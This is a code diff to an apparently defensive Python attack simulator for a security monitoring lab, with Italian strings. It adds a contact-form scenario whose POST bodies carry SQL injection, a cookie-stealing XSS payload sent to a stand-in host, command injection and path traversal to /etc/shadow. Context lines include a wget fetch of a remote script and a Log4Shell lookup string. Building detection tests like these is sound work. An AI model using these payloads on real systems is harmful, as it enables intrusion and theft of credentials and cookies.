@@ -30,6 +30,7 @@ PERSONAS = {
     "203.0.113.18": "San Paolo, Brasile",
     "203.0.113.20": "Shenzhen, Cina",
     "203.0.113.66": "Mosca, Russia",
+    "203.0.113.41": "Hanoi, Vietnam",
 }
 
 # The backdoor's controller: an HTTP listener on the attacker, which lab-01 calls once the intruder is in.
@@ -83,11 +84,40 @@ def ssh_try(source, user, password, log, command="true", script=None):
     return "blocked"
 
 
+# The web endpoint the current run aims at: None = the lab (target_for(source), http port 80, spoofed source address).
+# Set per run (threading.local) for an external server under test, where attacks go from this container's own address.
+_web = threading.local()
+
+
+def set_web_target(endpoint):
+    """endpoint is (host, port, scheme) for an external server, or None to go back to the lab."""
+    _web.target = endpoint
+
+
+def _dest(source):
+    """(host, port, scheme, bind_source) for a web request: the external target, or the lab's spoofed path."""
+    override = getattr(_web, "target", None)
+    if override is not None:
+        host, port, scheme = override
+        return host, port, scheme, None
+    return target_for(source), 80, "http", source
+
+
+def _connect(host, port, scheme, bind):
+    src = (bind, 0) if bind else None
+    if scheme == "https":
+        import ssl
+        # An attack simulation against a server under test: it may use a self-signed certificate, and a real attacker
+        # does not verify it either. This is never used to protect real data in transit.
+        return http.client.HTTPSConnection(host, port, timeout=4, source_address=src, context=ssl._create_unverified_context())
+    return http.client.HTTPConnection(host, port, timeout=4, source_address=src)
+
+
 def http_get(source, path, log=None, headers=None, quiet=False):
     """One GET from `source`, path sent as is (no normalisation: ../ stays ../). Returns the status or None."""
-    target = target_for(source)
+    target, port, scheme, bind = _dest(source)
     try:
-        conn = http.client.HTTPConnection(target, 80, timeout=4, source_address=(source, 0))
+        conn = _connect(target, port, scheme, bind)
         conn.putrequest("GET", path, skip_accept_encoding=True)
         for k, v in (headers or {"User-Agent": "Mozilla/5.0"}).items():
             conn.putheader(k, v)
@@ -98,6 +128,21 @@ def http_get(source, path, log=None, headers=None, quiet=False):
         status = None
     if log and not quiet:
         log(f"{source} → GET {path[:70]}: {status if status else 'nessuna risposta (bloccato)'}")
+    return status
+
+
+def http_post(source, path, body, log):
+    """One form POST from `source`: the attack is in the body, the access log only shows "POST path"."""
+    target, port, scheme, bind = _dest(source)
+    try:
+        conn = _connect(target, port, scheme, bind)
+        conn.request("POST", path, body=body, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                                                       "Content-Type": "application/x-www-form-urlencoded"})
+        status = conn.getresponse().status
+        conn.close()
+    except OSError:
+        status = None
+    log(f"{source} → POST {path} [{body[:60]}]: {status if status else 'nessuna risposta (bloccato)'}")
     return status
 
 
@@ -153,6 +198,18 @@ def web_exploit(log):
     http_get(src, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", log)
     http_get(src, "/cgi-bin/test.cgi?cmd=;wget%20http://203.0.113.9/x.sh", log)
     http_get(src, "/", log, {"User-Agent": "${jndi:ldap://203.0.113.9:1389/a}"})
+
+
+def hidden_post(log):
+    """Attacks in the body of the contact form: the URL is always /contatti.html, nginx's log sees nothing odd."""
+    src = "203.0.113.41"
+    for body in ["nome=Mario&email=m%40example.com&messaggio=Buongiorno%2C+vorrei+un+preventivo",
+                 "nome=x&email=x%40x.it&messaggio=1'+UNION+SELECT+username,password+FROM+utenti--",
+                 "nome=x&email=x%40x.it&messaggio=%3Cscript%3Edocument.location%3D'http://203.0.113.41/'%2Bdocument.cookie%3C/script%3E",
+                 "nome=x&email=x%40x.it&messaggio=%3Bcat+/etc/passwd",
+                 "nome=x&email=x%40x.it&allegato=../../../../etc/shadow"]:
+        http_post(src, "/contatti.html", body, log)
+        time.sleep(0.5)
 
 
 def web_login(log):
@@ -227,7 +284,8 @@ def backdoor(log):
 
 def full_night(log):
     for title, fn in [("Scansione delle porte", port_scan), ("Protocolli industriali", industrial_probe),
-                      ("Scansione del sito", web_scan), ("Exploit web", web_exploit), ("Intrusione", intrusion),
+                      ("Scansione del sito", web_scan), ("Exploit web", web_exploit), ("Attacco nascosto nel modulo", hidden_post),
+                      ("Intrusione", intrusion),
                       ("Dentro il server", inside), ("Backdoor", backdoor)]:
         log(f"— {title} —")
         fn(log)
@@ -246,39 +304,56 @@ SCENARIOS = [
      "expect": "Falco vede cosa fa dopo l'accesso: legge /etc/shadow, aggiunge una chiave SSH, avvia un miner, svuota wtmp. Tutto legato al suo indirizzo, gravità critica."},
     {"id": "backdoor", "title": "Backdoor che chiama casa", "source": C2, "run": backdoor,
      "expect": "Dopo l'accesso, lab-01 chiama il server di controllo: Suricata lo vede, CommandAndControl, gravità critica."},
-    {"id": "web-scan", "title": "Scansione del sito", "source": "203.0.113.14", "run": web_scan,
+    {"web": True, "id": "web-scan", "title": "Scansione del sito", "source": "203.0.113.14", "run": web_scan,
      "expect": "Richieste a .env, .git, WordPress, phpMyAdmin: WebVulnerabilityScan, ban di nginx-botsearch."},
-    {"id": "web-exploit", "title": "Tentativi di exploit web", "source": "203.0.113.9", "run": web_exploit,
+    {"web": True, "id": "web-exploit", "title": "Tentativi di exploit web", "source": "203.0.113.9", "run": web_exploit,
      "expect": "SQL injection, path traversal, PHPUnit, command injection, Log4Shell: WebExploitAttempt, gravità alta."},
-    {"id": "web-login", "title": "Forza bruta sull'area riservata", "source": "203.0.113.18", "run": web_login,
+    {"web": True, "id": "hidden-post", "title": "Attacco nascosto nel modulo contatti", "source": "203.0.113.41", "run": hidden_post,
+     "expect": "SQL injection, XSS e comandi nel corpo della POST: il log di nginx mostra solo «POST /contatti.html 200»; "
+               "ModSecurity li vede: WebExploitAttempt, gravità alta. Il primo messaggio è legittimo e non va segnalato."},
+    {"web": True, "id": "web-login", "title": "Forza bruta sull'area riservata", "source": "203.0.113.18", "run": web_login,
      "expect": "Password sbagliate su /admin/: WebLoginBruteForce, ban di nginx-http-auth."},
-    {"id": "flood", "title": "Flood di richieste", "source": "203.0.113.15", "run": flood,
+    {"web": True, "id": "flood", "title": "Flood di richieste", "source": "203.0.113.15", "run": flood,
      "expect": "nginx limita le richieste (429): RequestFlood, ban di nginx-limit-req."},
     {"id": "campaign", "title": "Campagna distribuita su un account", "source": "192.0.2.11–22", "run": campaign,
      "expect": "12 indirizzi, 2 tentativi ciascuno sull'account scada: nessun ban, una campagna DistributedSshBruteForce."},
     {"id": "full-night", "title": "La notte completa (in sequenza)", "source": "più indirizzi", "run": full_night,
-     "expect": "Scansione, protocolli industriali, sito, exploit, l'intrusione, cosa fa dentro e la backdoor: circa tre minuti."},
+     "expect": "Scansione, protocolli industriali, sito, exploit, modulo contatti, l'intrusione, cosa fa dentro e la backdoor: circa tre minuti."},
 ]
 
 
 def describe():
-    return [{"id": s["id"], "title": s["title"], "source": s["source"],
+    return [{"id": s["id"], "title": s["title"], "source": s["source"], "web": s.get("web", False),
              "place": PERSONAS.get(s["source"], "connessioni domestiche" if s["id"] == "campaign" else "più città"),
              "expect": s["expect"]} for s in SCENARIOS]
 
 
+def web_endpoint_of(target):
+    """(host, port, scheme) of an external target's web server, from the API url its key verified."""
+    import urllib.parse
+    parsed = urllib.parse.urlsplit(target["api"])
+    scheme = parsed.scheme
+    port = parsed.port or (443 if scheme == "https" else 80)
+    return parsed.hostname, port, scheme
+
+
 class Runner:
-    """One scenario at a time: the map is easier to read, and lab-01's bans stay attributable."""
+    """One scenario at a time: the map is easier to read, and the target's bans stay attributable."""
 
     def __init__(self):
         self._lock = threading.Lock()
         self.runs = []
         self.current = None
 
-    def start(self, scenario_id):
+    def start(self, scenario_id, target=None):
         scenario = next((s for s in SCENARIOS if s["id"] == scenario_id), None)
         if scenario is None:
             return None, "scenario sconosciuto"
+        external = target is not None and target.get("mode") == "external"
+        # Against an external server only the web-layer scenarios run: SSH brute force and port scans use spoofed
+        # source addresses that work only inside the lab, and must not be aimed at an arbitrary host.
+        if external and not scenario.get("web"):
+            return None, "contro un server esterno sono disponibili solo gli attacchi web (scansione, exploit, modulo, login, flood)"
         with self._lock:
             if self.current is not None:
                 return None, f"è già in corso «{self.current['title']}»"
@@ -287,19 +362,23 @@ class Runner:
             self.runs.append(run)
             self.runs = self.runs[-20:]
             self.current = run
-        threading.Thread(target=self._run, args=(scenario, run), daemon=True).start()
+        threading.Thread(target=self._run, args=(scenario, run, target if external else None), daemon=True).start()
         return run, None
 
-    def _run(self, scenario, run):
+    def _run(self, scenario, run, external):
         def log(msg):
             run["log"].append({"t": time.strftime("%H:%M:%S"), "msg": msg})
         try:
+            if external is not None:
+                set_web_target(web_endpoint_of(external))
+                log(f"bersaglio: {external['host']} ({external['web']}) — dal nostro indirizzo")
             scenario["run"](log)
             run["status"] = "finito"
         except Exception as ex:  # a failed scenario is reported in the console, never hidden
             log(f"errore: {ex}")
             run["status"] = "errore"
         finally:
+            set_web_target(None)
             run["finished"] = time.strftime("%H:%M:%S")
             with self._lock:
                 self.current = None
